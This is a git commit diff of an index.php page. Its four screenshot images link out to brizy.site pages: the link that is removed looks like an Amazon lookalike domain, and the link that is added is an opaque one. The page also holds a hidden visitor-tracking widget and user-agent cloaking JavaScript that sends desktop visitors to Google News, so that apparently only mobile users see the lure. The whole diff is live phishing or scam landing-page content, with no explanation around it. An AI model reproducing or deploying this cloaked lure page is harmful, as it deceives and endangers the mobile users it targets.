f7a96ad6363670570cea03785a6800b02d05a3de
trinidad1994 <88596846+trinidad1994@users.noreply.github.com>
2021-09-07 08:54:53 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,33 +1,28 @@
-<?php
+<meta name="deepview-service" content="deepview-service">
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet" type="text/css">
 
-// Genero: ProgramasProgramacion.com
-echo "<meta name=\"deepview-service\" content=\"deepview-service\">\n";
-echo "<link href=\"https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600\" rel=\"stylesheet\" type=\"text/css\">\n";
-echo "\n";
-echo "<p> </p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"345\" data-original-width=\"600\" height=\"368\" src=\"https://1.bp.blogspot.com/--3RpuxXy20o/YRcysgRw-FI/AAAAAAAAAqQ/2VI2qPihkGYYmI812pnyKQwggZeebo6RACLcBGAsYHQ/w640-h368/Screenshot_1.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"340\" data-original-width=\"600\" height=\"362\" src=\"https://1.bp.blogspot.com/-OkI5pdrlEBc/YRcyskaCwBI/AAAAAAAAAqI/z4JjWjf0ZAMiQHeuTsM3i5tYc-ganYd8wCLcBGAsYHQ/w640-h362/Screenshot_2.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"338\" data-original-width=\"600\" height=\"360\" src=\"https://1.bp.blogspot.com/-JTY5tMc8eIY/YRcysvUWSMI/AAAAAAAAAqE/AZqneWBIRR8bzxkYL3Qp6JSYpwpfuUExACLcBGAsYHQ/w640-h360/Screenshot_3.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"339\" data-original-width=\"600\" height=\"362\" src=\"https://1.bp.blogspot.com/-RY4bJlMGPxY/YRcytHAlxdI/AAAAAAAAAqM/Ku9FaF0QzEMSTPXp6vSgTxPkFGe3BhMqACLcBGAsYHQ/w640-h362/Screenshot_4.png\" width=\"640\" /></a></div><br />\n";
-echo "\n";
-echo "\n";
-echo "<div style=\"VISIBILITY: hidden;\"> <script type=\"text/javascript\" src=\"//widgets.amung.us/small.js\"></script><script type=\"text/javascript\">WAU_small('1si0uzxbdr')</script></div>\n";
-echo "\n";
-echo "\n";
-echo "\n";
-echo "<script type=\"text/javascript\">\n";
-echo "//<![CDATA[\n";
-echo " function h(r, a) { var t = \"\"; if (\"mix\" == a) var h = \n";
-echo "\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; else var h = \n";
-echo "\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * \n";
-echo "h.length)); return t };\n";
-echo "\n";
-echo "        var device = navigator.userAgent\n";
-echo "        \n";
-echo "        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))\n";
-echo "        {\n";
-echo "         \n";
-echo "        }else\n";
-echo "{\n";
-echo " window.location = \"https://news.google.com/topstories?tab=rn&hl=es-419&gl=US&ceid=US:es-419?\"+ h(23, '')+\"/?ref=bookmarks\";\n";
-echo "}\n";
-echo "//]]>\n";
-echo "</script>\n";
+<p>&nbsp;</p><div class="separator" style="clear: both; text-align: center;"><a href="https://coconut7845942.brizy.site/" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="345" data-original-width="600" height="368" src="https://1.bp.blogspot.com/--3RpuxXy20o/YRcysgRw-FI/AAAAAAAAAqQ/2VI2qPihkGYYmI812pnyKQwggZeebo6RACLcBGAsYHQ/w640-h368/Screenshot_1.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://coconut7845942.brizy.site/" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="340" data-original-width="600" height="362" src="https://1.bp.blogspot.com/-OkI5pdrlEBc/YRcyskaCwBI/AAAAAAAAAqI/z4JjWjf0ZAMiQHeuTsM3i5tYc-ganYd8wCLcBGAsYHQ/w640-h362/Screenshot_2.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://coconut7845942.brizy.site/" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="338" data-original-width="600" height="360" src="https://1.bp.blogspot.com/-JTY5tMc8eIY/YRcysvUWSMI/AAAAAAAAAqE/AZqneWBIRR8bzxkYL3Qp6JSYpwpfuUExACLcBGAsYHQ/w640-h360/Screenshot_3.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://coconut7845942.brizy.site/" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="339" data-original-width="600" height="362" src="https://1.bp.blogspot.com/-RY4bJlMGPxY/YRcytHAlxdI/AAAAAAAAAqM/Ku9FaF0QzEMSTPXp6vSgTxPkFGe3BhMqACLcBGAsYHQ/w640-h362/Screenshot_4.png" width="640" /></a></div><br />
 
-?>
+
+<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('1si0uzxbdr')</script></div>
+
+
+
+<script type="text/javascript">
+//<![CDATA[
+ function h(r, a) { var t = ""; if ("mix" == a) var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; else var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
+h.length)); return t };
+
+        var device = navigator.userAgent
+        
+        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
+        {
+         
+        }else
+{
+ window.location = "https://news.google.com/topstories?tab=rn&hl=es-419&gl=US&ceid=US:es-419?"+ h(23, '')+"/?ref=bookmarks";
+}
+//]]>
+</script>
